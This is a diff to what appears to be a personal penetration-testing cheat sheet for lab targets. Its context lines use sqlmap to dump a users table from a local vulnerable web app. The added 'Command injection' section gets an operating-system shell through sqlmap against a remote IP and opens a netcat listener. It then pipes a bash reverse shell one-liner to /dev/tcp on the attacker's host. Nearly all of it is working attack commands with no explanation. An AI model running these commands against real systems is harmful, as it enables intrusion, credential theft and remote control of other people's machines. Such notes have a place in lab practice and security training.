@@ -26,10 +26,21 @@ sqlmap -u "http://localhost:4280/vulnerabilities/sqli_blind/" --cookie="PHPSESSI
 sqlmap -u "http://localhost:4280/vulnerabilities/sqli_blind/" --cookie="PHPSESSID=cd8043482ce3c6e073f6c71cc520b195; security=medium" --data="id=1&Submit=Submit" -p id -T users --batch --threads 5 --dump
 
 
+```
+
+
+## Command injection
+
+```
+sqlmap http://10.129.37.76/dashboard.php?search=sedan --cookie="PHPSESSID=g1nbv00irvek6ggc5m1anvrhr4" --os-shell
+
+# spawn reverse shell: 
+sudo nc -lvnp 443 # ATTACKING MACHINE
+bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1" ## pass this to sqlmap shell console
+
 
 
 ```
-
 
 
 
